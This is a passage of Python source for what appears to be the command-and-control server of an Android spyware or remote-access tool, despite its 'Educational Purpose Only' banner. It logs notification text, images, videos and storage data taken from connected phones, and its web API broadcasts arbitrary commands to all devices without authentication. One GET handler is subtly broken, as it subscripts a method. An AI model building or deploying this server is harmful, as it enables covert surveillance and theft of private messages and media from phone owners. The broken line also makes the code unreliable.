elif msg_type == "storage_info":
            self.log(f"[i] Storage info from session {session.session_id}:")
            self.log(f"    Total: {message.get('total_gb', '?')} GB")
            self.log(f"    Free:  {message.get('free_gb', '?')} GB")
            self.log(f"    Used:  {message.get('used_percent', '?')}%")
            self.log_to_file(message, session.address)

        elif msg_type == "notification":
            notif = message.get("notification", {})
            package = notif.get("package", "Unknown")
            title = notif.get("title", "")
            text = notif.get("text", "")
            self.log(f"[📬] Notification from {package}:")
            self.log(f"     Title: {title}")
            self.log(f"     Text: {text}")
            with self.lock:
                session.total_notifications_received += 1
                session.notifications_buffer.append(notif)
            self.log_to_file(message, session.address)

        elif msg_type == "active_notifications":
            notifications = message.get("notifications", [])
            count = message.get("count", 0)
            self.log(f"[i] Active notifications from session {session.session_id} ({count} notifications):")
            for n in notifications[:20]:
                self.log(f"    [{n.get('package', '?')}] {n.get('title', '')}: {n.get('text', '')}")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            self.log_to_file(message, session.address)

        else:
            self.log(f"[i] Message from session {session.session_id}: {msg_type}")
            self.log_to_file(message, session.address)


# === HTTP SERVER FOR WEB GUI ===

class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
    """Handle HTTP requests for the web GUI."""
    
    # Reference to the DemoServer instance (set by server)
    server_instance = None
    
    def log_message(self, format, *args):
        # Override to suppress default log messages (we'll log ourselves if needed)
        pass
    
    def do_GET(self):
        """Handle GET requests."""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        
        # Serve static files
        if path == '/' or path == '/index.html':
            self.serve_file('index.html', 'text/html')
        elif path == '/style.css':
            self.serve_file('style.css', 'text/css')
        elif path == '/script.js':
            self.serve_file('script.js', 'application/javascript')
        elif path == '/favicon.ico':
            self.serve_file('favicon.ico', 'image/x-icon')
        # API endpoints
        elif path == '/api/devices':
            self.handle_get_devices()
        elif path == '/api/logs':
            self.handle_get_logs()
        elif path == '/api/stats':
            self.handle_get_stats()
        elif path == '/api/command':
            self.handle_get_command(query)
        else:
            self.send_error(404, "Not Found")
    
    def do_POST(self):
        """Handle POST requests."""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        
        if path == '/api/command':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                self.handle_post_command(data)
            except:
                self.send_error(400, "Bad Request")
        else:
            self.send_error(404, "Not Found")
    
    def serve_file(self, filename, content_type):
        """Serve a static file."""
        try:
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, "File Not Found")
        except Exception as e:
            self.log_error(f"Error serving {filename}: {e}")
            self.send_error(500, "Internal Server Error")
    
    def handle_get_devices(self):
        """Return JSON list of connected devices."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        
        with self.server_instance.lock:
            devices = []
            for sid, session in self.server_instance.sessions.items():
                if session.connected:
                    devices.append({
                        'id': sid,
                        'ip': session.address[0],
                        'model': session.device_info.get('model', 'Unknown'),
                        'status': 'ONLINE',
                        'images': session.total_images_received,
                        'videos': session.total_videos_received,
                        'notifications': session.total_notifications_received
                    })
            # Also include disconnected devices for completeness
            for sid, session in self.server_instance.sessions.items():
                if not session.connected:
                    devices.append({
                        'id': sid,
                        'ip': session.address[0],
                        'model': session.device_info.get('model', 'Unknown'),
                        'status': 'OFFLINE',
                        'images': session.total_images_received,
                        'videos': session.total_videos_received,
                        'notifications': session.total_notifications_received
                    })
            self.send_json_response(devices)
    
    def handle_get_logs(self):
        """Return recent logs for the web UI."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        logs = getattr(self.server_instance, 'recent_logs', [])
        self.send_json_response({'logs': logs})
    
    def handle_get_stats(self):
        """Return server statistics."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        self.server_instance.update_stats()
        self.send_json_response(self.server_instance.stats)
    
    def handle_get_command(self, query):
        """Handle GET request to /api/command (for simplicity, we'll support GET as well)."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        command = query.get('command', [''])[0]
        args = query.get['args', ['{}']][0]
        # In a real implementation, you might want to validate the command
        # For now, we'll just send it to all devices
        self.server_instance.send_command_to_all(command, args)
        self.send_json_response({'status': 'sent', 'command': command, 'args': args})
    
    def handle_post_command(self, data):
        """Handle POST request to /api/command."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        command = data.get('command', '')
        args = data.get('args', '{}')
        # Ensure args is a JSON string
        if isinstance(args, dict):
            args = json.dumps(args)
        self.server_instance.send_command_to_all(command, args)
        self.send_json_response({'status': 'sent', 'command': command, 'args': args})
    
    def send_json_response(self, data):
        """Send a JSON response."""
        response = json.dumps(data)
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(response)))
        self.end_headers()
        self.wfile.write(response.encode('utf-8'))
    
    def log_error(self, msg):
        """Log an error message."""
        if self.server_instance:
            self.server_instance.log(f"[!] HTTP Error: {msg}")
        else:
            print(f"[!] HTTP Error: {msg}")


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in separate threads."""
    daemon_threads = True
    allow_reuse_address = True


def main():
    """Main function to start both the socket server and the HTTP server."""
    import threading
    
    # Configuration
    SOCKET_HOST = '0.0.0.0'
    SOCKET_PORT = 8000
    HTTP_HOST = '0.0.0.0'
    HTTP_PORT = 8080
    
    # Create a shared log queue for communication between servers
    log_queue = queue.Queue()
    
    # Create the socket server instance
    socket_server = DemoServer(
        host=SOCKET_HOST,
        port=SOCKET_PORT,
        log_queue=log_queue,
        console_mode=False  # We'll handle commands via HTTP/API, not console
    )
    
    # Set the server instance in the HTTP handler
    ThreadedHTTPRequestHandler.server_instance = socket_server
    
    # Create HTTP server
    http_server = ThreadedHTTPServer((HTTP_HOST, HTTP_PORT), ThreadedHTTPRequestHandler)
    
    # Start socket server in a thread
    socket_thread = threading.Thread(target=socket_server.start, daemon=True)
    socket_thread.start()
    
    # Start HTTP server in a thread
    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
    http_thread.start()
    
    print("=" * 60)
    print("  ANDROID DEVICE DEMO SERVER - VERSION 5.1 WITH WEB GUI")
    print("  Educational Purpose Only")
    print("=" * 60)
    print(f"[+] Socket server listening on {SOCKET_HOST}:{SOCKET_PORT}")
    print(f"[+] HTTP server listening on {HTTP_HOST}:{HTTP_PORT}")
    print(f"[+] Open http://<server-ip>:{HTTP_PORT} in a browser to access the GUI")
    print("=" * 60)
    
    try:
        # Keep the main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down servers...")
        socket_server.running = False
        http_server.shutdown()
        # Wait for threads to finish (they are daemon threads, so they'll exit when main exits)
        # But we give them a moment to clean up
        time.sleep(2)
        print("[!] Servers stopped.")


if __name__ == "__main__":
    main()